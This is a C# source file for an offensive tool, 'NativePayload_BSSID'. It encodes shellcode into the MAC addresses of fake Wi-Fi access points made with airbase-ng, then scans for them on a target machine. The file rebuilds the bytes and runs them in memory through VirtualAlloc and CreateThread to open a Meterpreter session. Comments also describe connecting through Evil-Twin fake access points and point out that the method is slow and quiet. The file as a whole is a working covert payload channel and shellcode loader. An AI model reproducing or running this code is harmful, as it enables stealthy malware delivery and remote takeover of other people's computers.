using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using NativeWifi;
using System.Runtime.InteropServices;

namespace NativePayload_BSSID
{
    class Program
    {
        
        static string GetStringForSSID(Wlan.Dot11Ssid ssid)
        {
            return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
        }
        
        static string Temp_BSSID = "";
        static int counter = 0;
        static WlanClient client = new WlanClient();
        static bool init = false;
        static bool onetime = false;

        static string __show_BSSID(string filter_bssid) 
        {
            try
            {
                              
                foreach (WlanClient.WlanInterface wlanIface in client.Interfaces)
                {
                    try
                    {
                       
                        System.Threading.Thread.Sleep(1000);                        
                        Wlan.WlanBssEntry[] BSSLIST = wlanIface.GetNetworkBssList();
                        
                        try
                        {                          
                            wlanIface.Scan();                           
                        }
                        catch (Exception x1)
                        {

                            Console.WriteLine("x1: " + x1.Message);
                      
                        }
                        Temp_BSSID = "";
                        foreach (Wlan.WlanBssEntry item in BSSLIST)
                        {
                            string temp_filter = GetStringForSSID(item.dot11Ssid);
                            if (temp_filter == filter_bssid)
                            {
                               
                                Console.ForegroundColor = ConsoleColor.DarkCyan;
                                Console.Write("Detecting BSSID :");
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                foreach (var item2 in item.dot11Bssid)
                                {
                                    Console.Write(" {0}", item2.ToString("x2"));
                                    Temp_BSSID += item2.ToString("x2");
                                }
                                Console.ForegroundColor = ConsoleColor.DarkCyan;
                                Console.Write(" ESSID :");
                                Console.Write(" " + GetStringForSSID(item.dot11Ssid));
                                
                            }

                            
                        }
                        if (Temp_BSSID.Length > 2)
                        {
                            // remove 00 from first section , getting payload only since fake macaddress
                            Temp_BSSID = Temp_BSSID.Substring(2);
                        }
                        
                        if (Temp_BSSID == "ffffffffff") init = true;

                        if (init && MacAddress.Capacity != 0 && Temp_BSSID != MacAddress.AsEnumerable().Last().ToString() && Temp_BSSID!="ff00ff00ff" )
                        {
                            Console.ForegroundColor = ConsoleColor.DarkGreen;
                            Console.Write(" Dumped ");
                            if (Temp_BSSID != "")
                            {
                                    /// something is wrong or error happend
                                    /// sometimes this value is higher than 10 like 20 so we should getting last 10 char for this value always
                                    /// for dumping new and Correct BSSID
                                    if (Temp_BSSID.Length > 10) 
                                    {
                                        Temp_BSSID = Temp_BSSID.Substring(Temp_BSSID.Length - 10);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.Write("[X] {0}", Temp_BSSID);
                                        Console.ForegroundColor = ConsoleColor.DarkYellow;

                                    }

                                counter++;
                                MacAddress.Add(Temp_BSSID);
                            }
                        }
                        else if (MacAddress.Capacity == 0)
                        {
                            Console.ForegroundColor = ConsoleColor.DarkYellow;
                            Console.Write(" Dumped \n");
                            if (Temp_BSSID != "" && Temp_BSSID != "ffffffffff")
                            {
                                /// something is wrong or error happend
                                /// sometimes this value is higher than 10 like 20 so we should getting last 10 char for this value always
                                /// for dumping new and Correct BSSID
                                    if (Temp_BSSID.Length > 10)
                                    {
                                        Temp_BSSID = Temp_BSSID.Substring(Temp_BSSID.Length - 10);
                                        Console.ForegroundColor = ConsoleColor.Red;
                                        Console.Write("[X] {0}", Temp_BSSID);
                                        Console.ForegroundColor = ConsoleColor.DarkYellow;
                                    }

                                counter++;
                                MacAddress.Add(Temp_BSSID);
                            }
                        }
                        else if (Temp_BSSID == "ff00ff00ff") 
                        {
                            // time to exit and run payload
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("\n Done. \n");
                            Console.WriteLine("Running Payload ...");
                            return Temp_BSSID;
                        }
                        
                        if (MacAddress.Capacity != 0)
                        {
                            Console.WriteLine(" ==> " + counter + " " + MacAddress.AsEnumerable().Last().ToString());
                           
                          
                        }

                    }
                    catch (Exception ee)
                    {
                        Console.WriteLine("e2: "+ee.Message);
                      
                    }

                    /// this code was for Connecting by WEP or WPA to AP ,
                    /// but for Dumping Injected Payloads FROM Fake AP you need Scan Method only 
                    /// if ypu want to develop your own code like this for Connecting via Fake Access Point this code is very good ;)
                    /// something like Evil-Twin ....
                    /// and maybe you want get mterpreter session by WIFI traffic with Fake AP then you need this code for connecting
                    /// to Fake AP in C#
                    /// also you can dump information for this code like KEY , MAC and ProfileName  from Fake AP by my technique too
                    /// note : by Scan Method your attack is very Slowly and Quietly too

                    //foreach (Wlan.WlanProfileInfo profileInfo in wlanIface.GetProfiles())
                    //{
                    //    string name = profileInfo.profileName; // this is typically the network's SSID

                    //    string xml = wlanIface.GetProfileXml(profileInfo.profileName);
                    //}
                    
                    //string profileName = "Cheesecake";
                    //string mac = "52544131303235572D454137443638";
                    //string key = "hello";
                    //string profileXml = string.Format("<?xml version=\"1.0\"?><WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\"><name>{0}</name><SSIDConfig><SSID><hex>{1}</hex><name>{0}</name></SSID></SSIDConfig><connectionType>ESS</connectionType><MSM><security><authEncryption><authentication>open</authentication><encryption>WEP</encryption><useOneX>false</useOneX></authEncryption><sharedKey><keyType>networkKey</keyType><protected>false</protected><keyMaterial>{2}</keyMaterial></sharedKey><keyIndex>0</keyIndex></security></MSM></WLANProfile>", profileName, mac, key);

                    //wlanIface.SetProfile(Wlan.WlanProfileFlags.AllUser, profileXml, true);
                    //wlanIface.Connect(Wlan.WlanConnectionMode.Profile, Wlan.Dot11BssType.Any, profileName);
                    //wlanIface.DeleteProfile(profileName);
                }
            }
            catch (Exception eee)
            {
                Console.WriteLine("e3: " + eee.Message);                                             
            }
            return Temp_BSSID;
        }

        static List<string> MacAddress = new List<string>();
        public static string payload = "";
        static void Main(string[] args)
        {
            try
            {

                if (args.Length >= 1 && args[0].ToUpper() == "NULL")
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine();
                    Console.WriteLine("Copy these lines to bash script1.sh file ;)");                    
                    Console.WriteLine();
                    Console.ForegroundColor = ConsoleColor.Gray;
                    if (args.Length >= 2 && args[1] != null) { payload = args[1].ToString(); }
                    int b = 0;
                    int j = 0;
                    int LinesCode = 0;
                    string temp = "";
                    /// "00:ff:00:ff:00:ff" flag for Attack start
                    Console.WriteLine("airbase-ng -a 00:" + "ff:ff:ff:ff:ff" + " --essid \"Fake\" -I 10 -0 wlan0mon ;");
                    foreach (char item in payload)
                    {
                        temp += item;
                        
                        b++;
                        j++;
                        if (j == 2) { temp += ":"; j = 0; }
                        if (b >= 10)
                        {
                            /// essid is name for Access point , in this case "Fake" ;)
                            /// -I 10 , don't change this one , please 
                            Console.Write("airbase-ng -a 00:" + temp.Substring(0, temp.Length - 1) + " --essid \"Fake\" -I 10 -0 wlan0mon ;");
                            Console.WriteLine(""); b = 0;
                            temp = "";
                            LinesCode++;
                        }

                    }
                    /// "00:ff:00:ff:00:ff" flag for Attack Finish
                    Console.WriteLine("airbase-ng -a 00:" + "ff:00:ff:00:ff" + " --essid \"Fake\" -I 10 -0 wlan0mon ;");                    
                    
                    Console.WriteLine("");
                    Console.WriteLine("(" + LinesCode.ToString() + ") Command Lines for this PAYLOAD : " + payload);
                    
                }
                else if (args[0].ToUpper() != "NULL" && args[0].ToUpper() != "HELP")
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine();
                    Console.WriteLine("NativePayload_BSSID Tool Published by Damon Mohammadbagher");
                    Console.WriteLine("Scanning Access Point : " + args[0].ToString());
                    Console.WriteLine();
                    

                    while (true)
                    {
                    
                        /// dont change sleep time ;) 8 ... 10 is good 
                        /// if you want change these times then you need change all sleep value in Script1.sh Sleep(Value_Time) too
                        System.Threading.Thread.Sleep(8000);
                       
                        string _tmp_bssid = __show_BSSID(args[0]);
                       
                        /// flag for finish and execute Payload for getting Meterpreter Session
                        if (_tmp_bssid == "ff00ff00ff") break;
                    }

                    /// time to getting Meterpreter Session ;)
                    byte[] _X_Bytes = new byte[MacAddress.Capacity * 5];
                    int b = 0;
                    foreach (string X_item in MacAddress)
                    {
                        for (int i = 0; i <= 8; )
                        {
                            /// for debug only
                            /// string MacAddress_Octets = X_item.ToString().Substring(i, 2);                 

                            _X_Bytes[b] = Convert.ToByte("0x" + X_item.ToString().Substring(i, 2), 16);

                            b++;

                            i++; i++;
                        }
                    }
                    try
                    {
                        Console.WriteLine("Dumped Payloads : ");
                        int k = 0;
                        foreach (string item in MacAddress)
                        {
                            Console.Write(k.ToString() + ": " + item.ToString() + " ");
                            k++;
                        }
                        Console.WriteLine("15 sec Waiting....");
                        System.Threading.Thread.Sleep(15000);
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("End time : {0}", DateTime.Now.ToString());
                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Bingo Meterpreter session by BSSID and WIFI Traffic ;)");
                        UInt32 funcAddr = VirtualAlloc(0, (UInt32)_X_Bytes.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                        Marshal.Copy(_X_Bytes, 0, (IntPtr)(funcAddr), _X_Bytes.Length);
                        IntPtr hThread = IntPtr.Zero;
                        UInt32 threadId = 0;
                        IntPtr pinfo = IntPtr.Zero;
                        // execute native code
                        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                        WaitForSingleObject(hThread, 0xFFFFFFFF);

                    }
                    catch (Exception e6)
                    {

                        Console.ForegroundColor = ConsoleColor.Gray;
                        Console.WriteLine("Main Error : {0}", e6.Message);
                    }
                }
                else if(args[0].ToUpper()=="HELP")
                {
                    Console.ForegroundColor = ConsoleColor.Gray;
                    Console.WriteLine();
                    Console.WriteLine("NativePayload_BSSID Tool Published by Damon Mohammadbagher");
                    Console.WriteLine("Transferring Payload on AIR by BSSID and WIFI Traffic \n");
                    Console.ForegroundColor = ConsoleColor.Cyan;
                    Console.WriteLine("syntax 1 : Making Script.sh File for making Fake AP");
                    Console.WriteLine("\t   and injecting Payloads to AP MAC-Address by airbase-ng \n");
                    Console.WriteLine("syntax 1 : NativePaylaod_BSSID.exe null \"payload string\"");
                    Console.WriteLine("syntax 1 : NativePaylaod_BSSID.exe null \"fce80f109ab0371fbcd1100...\"\n");
                    Console.ForegroundColor = ConsoleColor.DarkCyan;
                    Console.WriteLine("syntax 2 : NativePaylaod_BSSID.exe \"Name for Access point OR essid\"");
                    Console.WriteLine("syntax 2 : NativePaylaod_BSSID.exe \"fake\"");
                    Console.ForegroundColor = ConsoleColor.Gray;
                }
            }
            catch (Exception e)
            {

                Console.WriteLine(e.Message);
            }
        
        }
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern bool VirtualFree(IntPtr lpAddress, UInt32 dwSize, UInt32 dwFreeType);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);   
    }
     
}
